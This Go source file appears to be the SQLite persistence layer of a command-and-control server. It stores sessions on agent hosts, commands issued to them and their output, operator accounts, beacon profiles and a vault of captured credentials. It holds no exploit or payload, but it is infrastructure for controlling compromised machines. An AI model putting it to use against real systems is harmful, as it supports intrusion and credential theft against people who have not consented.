package db

import (
	"crypto/rand"
	"database/sql"
	"fmt"
	"log"
	"sync"
	"time"

	_ "modernc.org/sqlite"
	"golang.org/x/crypto/bcrypt"
)

// DB wraps the SQLite database connection with thread-safe access.
type DB struct {
	conn *sql.DB
	mu   sync.RWMutex
	enc  *Encryptor // AES-256-GCM encryptor for sensitive columns
}

// SessionRecord represents a stored session.
type SessionRecord struct {
	ID         string
	AgentID    string
	Hostname   string
	OS         string
	Arch       string
	Username   string
	IsAdmin    bool
	PublicIP   string
	LocalIP    string
	MACAddr    string
	FirstSeen  time.Time
	LastSeen   time.Time
	State      string
	TaskCount  int
}

// TaskRecord represents a stored task.
type TaskRecord struct {
	ID         string
	SessionID  string
	Command    string
	Output     string
	ExitCode   int
	Success    bool
	IssuedAt   time.Time
	CompletedAt *time.Time
}

// OperatorRecord represents a C2 operator.
type OperatorRecord struct {
	ID           int
	Username     string
	PasswordHash string
	Role         string
	CreatedAt    time.Time
}

// CredentialRecord represents a stored credential.
type CredentialRecord struct {
	ID       string
	Username string
	Password string
	Domain   string
	Host     string
	Service  string
	Source   string
	Notes    string
	Captured time.Time
}

// QueuedTask represents a task in the offline queue.
type QueuedTask struct {
	ID          string
	SessionID   string
	Command     string
	Status      string // pending, delivered, completed, failed
	Result      string
	ExitCode    int
	Success     bool
	CreatedAt   time.Time
	DeliveredAt *time.Time
	CompletedAt *time.Time
	OperatorID  *int
	TimeoutSec  int
}

// Open opens (or creates) a SQLite database at the given path.
func Open(dsn string) (*DB, error) {
	return OpenWithEncryption(dsn, nil)
}

// OpenWithEncryption opens a database with optional AES-256-GCM encryption for sensitive columns.
func OpenWithEncryption(dsn string, masterKey []byte) (*DB, error) {
	conn, err := sql.Open("sqlite", dsn)
	if err != nil {
		return nil, fmt.Errorf("open db: %w", err)
	}

	// WAL mode for better concurrent read performance
	// SQLite supports multiple readers with WAL, single writer
	conn.SetMaxOpenConns(4)  // Allow limited concurrency for reads
	conn.SetMaxIdleConns(2)  // Keep some connections warm
	conn.SetConnMaxLifetime(30 * time.Minute)

	db := &DB{conn: conn}

	// Initialize encryptor if master key provided
	if len(masterKey) > 0 {
		enc, err := NewEncryptor(masterKey)
		if err != nil {
			conn.Close()
			return nil, fmt.Errorf("create encryptor: %w", err)
		}
		db.enc = enc
		log.Println("[DB] At-rest encryption enabled (AES-256-GCM)")
	}

	// Enable WAL mode and other performance optimizations
	if err := db.configureSQLite(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("configure sqlite: %w", err)
	}

	// Run migrations instead of direct schema creation
	if err := db.Migrate(); err != nil {
		conn.Close()
		return nil, fmt.Errorf("migrate: %w", err)
	}

	return db, nil
}

// configureSQLite enables WAL mode and other optimizations.
func (d *DB) configureSQLite() error {
	pragmas := []string{
		`PRAGMA journal_mode=WAL`,              // Write-Ahead Logging for concurrent reads
		`PRAGMA synchronous=NORMAL`,            // Faster writes, still safe with WAL
		`PRAGMA cache_size=-64000`,             // 64MB cache (negative = KB)
		`PRAGMA temp_store=MEMORY`,             // Temp tables in memory
		`PRAGMA mmap_size=268435456`,           // 256MB memory-mapped I/O
		`PRAGMA foreign_keys=ON`,               // Enforce foreign key constraints
		`PRAGMA busy_timeout=5000`,             // Wait 5s for locks instead of failing
		`PRAGMA wal_autocheckpoint=1000`,       // Auto-checkpoint every 1000 pages
	}

	for _, pragma := range pragmas {
		if _, err := d.conn.Exec(pragma); err != nil {
			log.Printf("[DB] Warning: failed to set %s: %v", pragma, err)
		}
	}

	return nil
}

func (d *DB) Close() error {
	return d.conn.Close()
}

// --- Session operations ---

// UpsertSession creates or updates a session record.
func (d *DB) UpsertSession(s *SessionRecord) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`
		INSERT INTO sessions (id, agent_id, hostname, os, arch, username, is_admin, public_ip, local_ip, mac_address, last_seen, state)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(id) DO UPDATE SET
			hostname=excluded.hostname, os=excluded.os, arch=excluded.arch,
			username=excluded.username, is_admin=excluded.is_admin,
			public_ip=excluded.public_ip, local_ip=excluded.local_ip,
			mac_address=excluded.mac_address, last_seen=excluded.last_seen,
			state=excluded.state`,
		s.ID, s.AgentID, s.Hostname, s.OS, s.Arch, s.Username,
		boolToInt(s.IsAdmin), s.PublicIP, s.LocalIP, s.MACAddr,
		s.LastSeen, s.State,
	)
	return err
}

// UpdateSessionState updates the state of a session.
func (d *DB) UpdateSessionState(id, state string) error {
	d.mu.Lock()
	defer d.mu.Unlock()
	_, err := d.conn.Exec(`UPDATE sessions SET state=?, last_seen=? WHERE id=?`,
		state, time.Now(), id)
	return err
}

// UpdateSessionLastSeen bumps the last_seen timestamp.
func (d *DB) UpdateSessionLastSeen(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()
	_, err := d.conn.Exec(`UPDATE sessions SET last_seen=? WHERE id=?`,
		time.Now(), id)
	return err
}

// GetSession retrieves a session by ID.
func (d *DB) GetSession(id string) (*SessionRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	s := &SessionRecord{}
	var isAdmin int
	err := d.conn.QueryRow(`
		SELECT id, agent_id, hostname, os, arch, username, is_admin,
			   public_ip, local_ip, mac_address, first_seen, last_seen, state
		FROM sessions WHERE id=?`, id).Scan(
		&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch, &s.Username,
		&isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
		&s.FirstSeen, &s.LastSeen, &s.State,
	)
	if err != nil {
		return nil, err
	}
	s.IsAdmin = isAdmin != 0
	return s, nil
}

// GetSessionByAgentID retrieves a session by agent ID.
func (d *DB) GetSessionByAgentID(agentID string) (*SessionRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	s := &SessionRecord{}
	var isAdmin int
	err := d.conn.QueryRow(`
		SELECT id, agent_id, hostname, os, arch, username, is_admin,
			   public_ip, local_ip, mac_address, first_seen, last_seen, state
		FROM sessions WHERE agent_id=?`, agentID).Scan(
		&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch, &s.Username,
		&isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
		&s.FirstSeen, &s.LastSeen, &s.State,
	)
	if err != nil {
		return nil, err
	}
	s.IsAdmin = isAdmin != 0
	return s, nil
}

// ListActiveSessions returns all sessions that are not dead.
func (d *DB) ListActiveSessions() ([]SessionRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, agent_id, hostname, os, arch, username, is_admin,
			   public_ip, local_ip, mac_address, first_seen, last_seen, state,
			   (SELECT COUNT(*) FROM tasks WHERE session_id=sessions.id) as task_count
		FROM sessions WHERE state != 'dead' ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	return scanSessions(rows)
}

// ListAllSessions returns all sessions ever.
func (d *DB) ListAllSessions() ([]SessionRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, agent_id, hostname, os, arch, username, is_admin,
			   public_ip, local_ip, mac_address, first_seen, last_seen, state,
			   (SELECT COUNT(*) FROM tasks WHERE session_id=sessions.id)
		FROM sessions ORDER BY last_seen DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	return scanSessions(rows)
}

// DeleteSession removes a session and its tasks.
func (d *DB) DeleteSession(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	tx, err := d.conn.Begin()
	if err != nil {
		return err
	}
	defer tx.Rollback()

	if _, err := tx.Exec(`DELETE FROM tasks WHERE session_id=?`, id); err != nil {
		return err
	}
	if _, err := tx.Exec(`DELETE FROM sessions WHERE id=?`, id); err != nil {
		return err
	}
	return tx.Commit()
}

// --- Task operations ---

// InsertTask creates a new task record.
func (d *DB) InsertTask(t *TaskRecord) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`
		INSERT INTO tasks (id, session_id, command, output, exit_code, success, issued_at, completed_at)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
		t.ID, t.SessionID, t.Command, t.Output, t.ExitCode, boolToInt(t.Success),
		t.IssuedAt, t.CompletedAt,
	)
	return err
}

// UpdateTaskResult updates a task with its result.
func (d *DB) UpdateTaskResult(id, output string, exitCode int, success bool) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	now := time.Now()
	_, err := d.conn.Exec(`
		UPDATE tasks SET output=?, exit_code=?, success=?, completed_at=? WHERE id=?`,
		output, exitCode, boolToInt(success), now, id,
	)
	return err
}

// GetSessionTasks returns all tasks for a session.
func (d *DB) GetSessionTasks(sessionID string) ([]TaskRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, session_id, command, output, exit_code, success, issued_at, completed_at
		FROM tasks WHERE session_id=? ORDER BY issued_at DESC LIMIT 100`, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	return scanTasks(rows)
}

// --- Operator operations ---

// CreateOperator creates a new operator with bcrypt-hashed password.
func (d *DB) CreateOperator(username, password, role string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return fmt.Errorf("hash password: %w", err)
	}

	_, err = d.conn.Exec(`INSERT INTO operators (username, password_hash, role) VALUES (?, ?, ?)`,
		username, string(hash), role)
	return err
}

// CreateOperatorWithHash creates a new operator with a pre-hashed password.
func (d *DB) CreateOperatorWithHash(username, passwordHash, role string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	if len(passwordHash) < 59 || (passwordHash[:4] != "$2a$" && passwordHash[:4] != "$2b$") {
		return fmt.Errorf("invalid bcrypt hash format")
	}

	_, err := d.conn.Exec(`INSERT INTO operators (username, password_hash, role) VALUES (?, ?, ?)`,
		username, passwordHash, role)
	return err
}

// AuthenticateOperator verifies operator credentials.
func (d *DB) AuthenticateOperator(username, password string) (*OperatorRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	op := &OperatorRecord{}
	err := d.conn.QueryRow(`
		SELECT id, username, password_hash, role, created_at
		FROM operators WHERE username=?`, username).Scan(
		&op.ID, &op.Username, &op.PasswordHash, &op.Role, &op.CreatedAt,
	)
	if err != nil {
		return nil, fmt.Errorf("invalid credentials")
	}

	if err := bcrypt.CompareHashAndPassword([]byte(op.PasswordHash), []byte(password)); err != nil {
		return nil, fmt.Errorf("invalid credentials")
	}

	return op, nil
}

// ListOperators returns all operators (without password hashes).
func (d *DB) ListOperators() ([]map[string]interface{}, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`SELECT id, username, role, created_at FROM operators ORDER BY created_at DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var operators []map[string]interface{}
	for rows.Next() {
		var op OperatorRecord
		if err := rows.Scan(&op.ID, &op.Username, &op.Role, &op.CreatedAt); err != nil {
			return nil, err
		}
		operators = append(operators, map[string]interface{}{
			"id":       op.ID,
			"username": op.Username,
			"role":     op.Role,
			"created_at": op.CreatedAt,
		})
	}
	return operators, rows.Err()
}

// DeleteOperator removes an operator by ID.
func (d *DB) DeleteOperator(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`DELETE FROM operators WHERE id=?`, id)
	return err
}

// --- Server secrets persistence ---

// GetSecret retrieves a persisted server secret (decrypts if encryption is enabled).
func (d *DB) GetSecret(key string) ([]byte, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	var value []byte
	err := d.conn.QueryRow(`SELECT value FROM server_secrets WHERE key=?`, key).Scan(&value)
	if err != nil {
		return nil, err
	}

	if d.enc != nil {
		dec, err := d.enc.Decrypt(string(value))
		if err != nil {
			// Fallback: return raw value if decryption fails (legacy data)
			return value, nil
		}
		return dec, nil
	}

	return value, nil
}

// SetSecret stores a server secret (encrypted if encryption is enabled).
func (d *DB) SetSecret(key string, value []byte) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	stored := value
	if d.enc != nil {
		enc, err := d.enc.Encrypt(value)
		if err != nil {
			return fmt.Errorf("encrypt secret: %w", err)
		}
		stored = []byte(enc)
	}

	_, err := d.conn.Exec(`INSERT OR REPLACE INTO server_secrets (key, value) VALUES (?, ?)`, key, stored)
	return err
}

// --- Credential vault operations (SQLite-backed) ---

// AddCredential stores a credential in the database (encrypted if enabled).
func (d *DB) AddCredential(c *CredentialRecord) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	password := c.Password
	notes := c.Notes
	if d.enc != nil {
		if p, err := d.enc.EncryptString(c.Password); err == nil {
			password = p
		}
		if n, err := d.enc.EncryptString(c.Notes); err == nil {
			notes = n
		}
	}

	_, err := d.conn.Exec(`
		INSERT INTO credentials (id, username, password, domain, host, service, source, notes, captured)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)`,
		c.ID, c.Username, password, c.Domain, c.Host, c.Service, c.Source, notes, c.Captured)
	return err
}

// ListCredentials returns all credentials (decrypted if encryption is enabled).
func (d *DB) ListCredentials() ([]CredentialRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, username, password, domain, host, service, source, notes, captured
		FROM credentials ORDER BY captured DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []CredentialRecord
	for rows.Next() {
		var c CredentialRecord
		if err := rows.Scan(&c.ID, &c.Username, &c.Password, &c.Domain, &c.Host, &c.Service, &c.Source, &c.Notes, &c.Captured); err != nil {
			return nil, err
		}
		if d.enc != nil {
			if p, err := d.enc.DecryptString(c.Password); err == nil {
				c.Password = p
			}
			if n, err := d.enc.DecryptString(c.Notes); err == nil {
				c.Notes = n
			}
		}
		creds = append(creds, c)
	}
	return creds, rows.Err()
}

// SearchCredentials searches credentials by keyword (searches encrypted data).
func (d *DB) SearchCredentials(query string) ([]CredentialRecord, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, username, password, domain, host, service, source, notes, captured
		FROM credentials ORDER BY captured DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var creds []CredentialRecord
	for rows.Next() {
		var c CredentialRecord
		if err := rows.Scan(&c.ID, &c.Username, &c.Password, &c.Domain, &c.Host, &c.Service, &c.Source, &c.Notes, &c.Captured); err != nil {
			return nil, err
		}
		if d.enc != nil {
			if p, err := d.enc.DecryptString(c.Password); err == nil {
				c.Password = p
			}
			if n, err := d.enc.DecryptString(c.Notes); err == nil {
				c.Notes = n
			}
		}
		// Client-side search since data is encrypted
		if containsStr(c.Username, query) || containsStr(c.Domain, query) ||
			containsStr(c.Host, query) || containsStr(c.Service, query) ||
			containsStr(c.Source, query) || containsStr(c.Notes, query) {
			creds = append(creds, c)
		}
	}
	return creds, rows.Err()
}

// DeleteCredential removes a credential by ID.
func (d *DB) DeleteCredential(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`DELETE FROM credentials WHERE id=?`, id)
	return err
}

// CountCredentials returns the number of stored credentials.
func (d *DB) CountCredentials() (int, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	var count int
	err := d.conn.QueryRow(`SELECT COUNT(*) FROM credentials`).Scan(&count)
	return count, err
}

// --- Task queue operations (offline task support) ---

// QueueTask adds a task to the offline queue.
func (d *DB) QueueTask(t *QueuedTask) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`
		INSERT INTO task_queue (id, session_id, command, status, timeout_sec, operator_id)
		VALUES (?, ?, ?, 'pending', ?, ?)`,
		t.ID, t.SessionID, t.Command, t.TimeoutSec, t.OperatorID)
	return err
}

// GetPendingTasks returns all pending tasks for a session.
func (d *DB) GetPendingTasks(sessionID string) ([]QueuedTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, session_id, command, status, result, exit_code, success, created_at, delivered_at, completed_at, operator_id, timeout_sec
		FROM task_queue WHERE session_id=? AND status='pending' ORDER BY created_at ASC`, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	return scanQueuedTasks(rows)
}

// MarkTaskDelivered marks a task as delivered to the agent.
func (d *DB) MarkTaskDelivered(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`UPDATE task_queue SET status='delivered', delivered_at=? WHERE id=?`, time.Now(), id)
	return err
}

// CompleteTask marks a queued task as completed with result.
func (d *DB) CompleteTask(id, result string, exitCode int, success bool) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`
		UPDATE task_queue SET status=?, result=?, exit_code=?, success=?, completed_at=? WHERE id=?`,
		map[bool]string{true: "completed", false: "failed"}[success], result, exitCode, boolToInt(success), time.Now(), id)
	return err
}

// ListQueuedTasks returns all queued tasks for a session.
func (d *DB) ListQueuedTasks(sessionID string) ([]QueuedTask, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT id, session_id, command, status, result, exit_code, success, created_at, delivered_at, completed_at, operator_id, timeout_sec
		FROM task_queue WHERE session_id=? ORDER BY created_at DESC`, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	return scanQueuedTasks(rows)
}

// DeleteQueuedTask removes a task from the queue.
func (d *DB) DeleteQueuedTask(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`DELETE FROM task_queue WHERE id=?`, id)
	return err
}

// --- Team collaboration ---

// AddSessionNote adds a note to a session.
func (d *DB) AddSessionNote(sessionID string, operatorID int, content string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	id := fmt.Sprintf("note-%x", time.Now().UnixNano())
	_, err := d.conn.Exec(`INSERT INTO session_notes (id, session_id, operator_id, content) VALUES (?, ?, ?, ?)`,
		id, sessionID, operatorID, content)
	return err
}

// GetSessionNotes returns all notes for a session.
func (d *DB) GetSessionNotes(sessionID string) ([]map[string]interface{}, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`
		SELECT sn.id, sn.content, sn.operator_id, o.username, sn.created_at
		FROM session_notes sn
		LEFT JOIN operators o ON sn.operator_id = o.id
		WHERE sn.session_id=? ORDER BY sn.created_at ASC`, sessionID)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var notes []map[string]interface{}
	for rows.Next() {
		var id, content, username string
		var operatorID int
		var createdAt time.Time
		if err := rows.Scan(&id, &content, &operatorID, &username, &createdAt); err != nil {
			return nil, err
		}
		notes = append(notes, map[string]interface{}{
			"id":          id,
			"content":     content,
			"operator_id": operatorID,
			"username":    username,
			"created_at":  createdAt,
		})
	}
	return notes, rows.Err()
}

// LockSession locks a session for an operator.
func (d *DB) LockSession(sessionID string, operatorID int) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`INSERT OR REPLACE INTO session_locks (session_id, operator_id, locked_at) VALUES (?, ?, ?)`,
		sessionID, operatorID, time.Now())
	return err
}

// UnlockSession unlocks a session.
func (d *DB) UnlockSession(sessionID string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`DELETE FROM session_locks WHERE session_id=?`, sessionID)
	return err
}

// GetSessionLock returns the operator who locked a session.
func (d *DB) GetSessionLock(sessionID string) (*int, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	var operatorID int
	err := d.conn.QueryRow(`SELECT operator_id FROM session_locks WHERE session_id=?`, sessionID).Scan(&operatorID)
	if err == sql.ErrNoRows {
		return nil, nil
	}
	return &operatorID, err
}

// --- Agent profiles ---

// CreateAgentProfile creates a new agent configuration profile.
func (d *DB) CreateAgentProfile(id, name string, beaconInterval int, jitter float64, transport string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`INSERT INTO agent_profiles (id, name, beacon_interval, jitter, transport) VALUES (?, ?, ?, ?, ?)`,
		id, name, beaconInterval, jitter, transport)
	return err
}

// ListAgentProfiles returns all agent profiles.
func (d *DB) ListAgentProfiles() ([]map[string]interface{}, error) {
	d.mu.RLock()
	defer d.mu.RUnlock()

	rows, err := d.conn.Query(`SELECT id, name, beacon_interval, jitter, transport, created_at FROM agent_profiles ORDER BY created_at DESC`)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var profiles []map[string]interface{}
	for rows.Next() {
		var id, name, transport string
		var beaconInterval int
		var jitter float64
		var createdAt time.Time
		if err := rows.Scan(&id, &name, &beaconInterval, &jitter, &transport, &createdAt); err != nil {
			return nil, err
		}
		profiles = append(profiles, map[string]interface{}{
			"id":              id,
			"name":            name,
			"beacon_interval": beaconInterval,
			"jitter":          jitter,
			"transport":       transport,
			"created_at":      createdAt,
		})
	}
	return profiles, rows.Err()
}

// DeleteAgentProfile removes an agent profile.
func (d *DB) DeleteAgentProfile(id string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`DELETE FROM agent_profiles WHERE id=?`, id)
	return err
}

// --- Audit operations ---

// LogAction records an operator action.
func (d *DB) LogAction(operatorID int, action, detail string) error {
	d.mu.Lock()
	defer d.mu.Unlock()

	_, err := d.conn.Exec(`INSERT INTO audit_log (operator_id, action, detail) VALUES (?, ?, ?)`,
		operatorID, action, detail)
	return err
}

// --- Helpers ---

func scanSessions(rows *sql.Rows) ([]SessionRecord, error) {
	var sessions []SessionRecord
	for rows.Next() {
		var s SessionRecord
		var isAdmin int
		if err := rows.Scan(&s.ID, &s.AgentID, &s.Hostname, &s.OS, &s.Arch,
			&s.Username, &isAdmin, &s.PublicIP, &s.LocalIP, &s.MACAddr,
			&s.FirstSeen, &s.LastSeen, &s.State, &s.TaskCount); err != nil {
			return nil, err
		}
		s.IsAdmin = isAdmin != 0
		sessions = append(sessions, s)
	}
	return sessions, rows.Err()
}

func scanTasks(rows *sql.Rows) ([]TaskRecord, error) {
	var tasks []TaskRecord
	for rows.Next() {
		var t TaskRecord
		var completedAt *time.Time
		var success int
		if err := rows.Scan(&t.ID, &t.SessionID, &t.Command, &t.Output,
			&t.ExitCode, &success, &t.IssuedAt, &completedAt); err != nil {
			return nil, err
		}
		t.Success = success != 0
		t.CompletedAt = completedAt
		tasks = append(tasks, t)
	}
	return tasks, rows.Err()
}

func scanQueuedTasks(rows *sql.Rows) ([]QueuedTask, error) {
	var tasks []QueuedTask
	for rows.Next() {
		var t QueuedTask
		var deliveredAt, completedAt *time.Time
		var operatorID *int
		var success int
		if err := rows.Scan(&t.ID, &t.SessionID, &t.Command, &t.Status, &t.Result,
			&t.ExitCode, &success, &t.CreatedAt, &deliveredAt, &completedAt, &operatorID, &t.TimeoutSec); err != nil {
			return nil, err
		}
		t.Success = success != 0
		t.DeliveredAt = deliveredAt
		t.CompletedAt = completedAt
		t.OperatorID = operatorID
		tasks = append(tasks, t)
	}
	return tasks, rows.Err()
}

func boolToInt(b bool) int {
	if b {
		return 1
	}
	return 0
}

func containsStr(s, substr string) bool {
	return len(s) >= len(substr) && indexStr(s, substr) >= 0
}

func indexStr(s, substr string) int {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return i
		}
	}
	return -1
}

// Internal helpers
func generateID(prefix string) string {
	b := make([]byte, 8)
	rand.Read(b)
	return fmt.Sprintf("%s-%x", prefix, b)
}

// Ensure log is imported
var _ = log.Default
